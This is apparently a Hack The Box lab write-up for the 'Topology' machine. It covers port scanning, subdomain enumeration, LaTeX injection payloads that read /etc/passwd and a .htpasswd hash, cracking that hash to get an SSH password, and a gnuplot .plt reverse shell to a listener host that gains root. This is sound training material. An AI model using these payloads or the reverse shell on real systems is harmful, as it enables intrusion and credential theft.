# Topology

This is the write-up for Topology from Hack The Box.

# Reconnaissance

First, we execute a full port scan on the machine.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/topology]                                                                                                                                                                   
╰─ $ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.217

PORT   STATE SERVICE                                                                                                                                                                                                                         
22/tcp open  ssh                                                                                                                                                                                                                             
80/tcp open  http
```

Then, we execute a port scan only on the open ports found on the previous port scan.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/topology]                                                                                                                                                                   
╰─ $ sudo nmap -vv -sC -sV -Pn -p 22,80 -oA nmap/topology 10.10.11.217

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accessing the webpage running on port 80, we got.

![Untitled](images/Untitled.png)

Navigating on the site, we access a link (LaTeX Equation Generator), and we are redirected to the following page.

![Untitled](images/Untitled%201.png)

We got an error message, we just write this subdomain down in our `/etc/hosts` local file.

![Untitled](images/Untitled%202.png)

Now we are able to access the webpage correctly.

![Untitled](images/Untitled%203.png)

# Enumeration

As we had to write the new subdomain on our hosts file, we execute a brute-force subdomain enumeration on the domain `topology.htb` .

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/topology]
╰─ $ gobuster vhost -u "http://topology.htb/" -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" -t 40 -o gobuster/topology_vhosts --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://topology.htb/
[+] Method:          GET
[+] Threads:         40
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.topology.htb Status: 401 [Size: 463]
Found: stats.topology.htb Status: 200 [Size: 108]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

We write these new subdomains found in our `/etc/hosts` files too.

![Untitled](images/Untitled%204.png)

Accessing these subdomains, on **dev** we were asked for credentials.

![Untitled](images/Untitled%205.png)

On stats, we got the following webpage.

![Untitled](images/Untitled%206.png)

# Exploitation

On the `equation.php` endpoint, we tried some LaTeX Injections in order to verify if the functionality is vulnerable. First we tried to insert the command `\input{/etc/passwd}`, but we got an error.

![Untitled](images/Untitled%207.png)

After trying some payloads, we could read the `/etc/passwd`’s first line file using the payload: 

```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

![Untitled](images/Untitled%208.png)

We were able to read the entire `/etc/passwd` file just putting the command `\lstinputlisting{/etc/passwd}` between ***$$***

`$\lstinputlisting{/etc/passwd}$`

![Untitled](images/Untitled%209.png)

On the dev subdomain, we tried to read the `.htpasswd` file and we were able to retrieve the vdaisley user’s password hash using the payload `$\lstinputlisting{/var/www/dev/.htpasswd}$`.

![Untitled](images/Untitled%2010.png)

We downloaded the image that was generate with the password’s hash and upload this image on the site below and extracted the text of the image.

[Extract Text From an Image | Online Text Extractor | Brandfolder](https://brandfolder.com/workbench/extract-text-from-image)

![Untitled](images/Untitled%2011.png)

We check the hash using the name-that-hash tool and we could confirm that is a MD5 hash.

![Untitled](images/Untitled%2012.png)

We were able to crack the hash and get the vdaisley’s credentials.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/topology]
╰─ $ john --wordlist=/usr/share/wordlists/rockyou.txt hash         
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:01 DONE (2023-08-16 17:06) 0.5181g/s 516012p/s 516012c/s 516012C/s callel..cadesmom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We log into the host through SSH service with this credential.

```bash
╭─[us-free-3]-[10.10.14.217]-[th3g3ntl3m4n@kali]-[~/htb/machines/topology]
╰─ $ ssh vdaisley@topology.htb
vdaisley@topology.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Aug 16 17:12:31 2023 from 10.10.14.217
-bash-5.0$ id;ls -la
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
total 40
drwxr-xr-x 6 vdaisley vdaisley 4096 Aug 16 14:18 .
drwxr-xr-x 3 root     root     4096 May 19 13:04 ..
lrwxrwxrwx 1 root     root        9 Mar 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 vdaisley vdaisley  220 Jan 17  2023 .bash_logout
-rw-r--r-- 1 vdaisley vdaisley 3771 Jan 17  2023 .bashrc
drwx------ 2 vdaisley vdaisley 4096 May 19 13:04 .cache
drwx------ 3 vdaisley vdaisley 4096 May 19 13:04 .config
drwx------ 3 vdaisley vdaisley 4096 Aug 16 16:49 .gnupg
drwxrwxr-x 3 vdaisley vdaisley 4096 Aug 16 14:18 .local
-rw-r--r-- 1 vdaisley vdaisley  807 Jan 17  2023 .profile
-rw-r----- 1 root     vdaisley   33 Aug 16 02:33 user.txt
```

# Privilege Escalation

We upload to the machine the pspy64 tool in order to verify which processes are running with their respective user’s permission. We verified that there is a `gnuplot` application running as root.

![Untitled](images/Untitled%2013.png)

This tool generates graphics through axis X and axis Y, something like we saw on the ***stats*** subdomain. Checking the `/opt` directory, we verify we have permission to write files in the `gnuplot` directory.

![Untitled](images/Untitled%2014.png)

And, in pspy64, we verify that the user root runs a find command in order to search for PLT files and execute `gnuplot`. Searching for how to exploit PLT files with `gnuplot`, we could see that we can write our malicious payload in a `.plt` file and execute it using system.

[Gnuplot Privilege Escalation | Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/)

We create `th3g3ntl3m4n.plt` file in `/opt/gnuplot` directory with our payload `system "bash -c 'bash -i >& /dev/tcp/10.10.14.217/443 0>&1'"`.

```bash
-bash-5.0$ echo "system \"bash -c 'bash -i >& /dev/tcp/10.10.14.217/443 0>&1'\"" > th3g3ntl3m4n.plt
-bash-5.0$ ls -la
total 3044
drwxrwxr-x  2 vdaisley vdaisley    4096 Aug 16 17:41 .
drwxrwxrwt 16 root     root        4096 Aug 16 17:39 ..
-rwxrwxr-x  1 vdaisley vdaisley 3104768 Aug 16 17:17 pspy64
-rw-rw-r--  1 vdaisley vdaisley      61 Aug 16 17:41 th3g3ntl3m4n.plt
```

We copied our malicious file to the gnuplot directory and open our listener on port 443.

![Untitled](images/Untitled%2015.png)

Now we get a reverse shell as user root.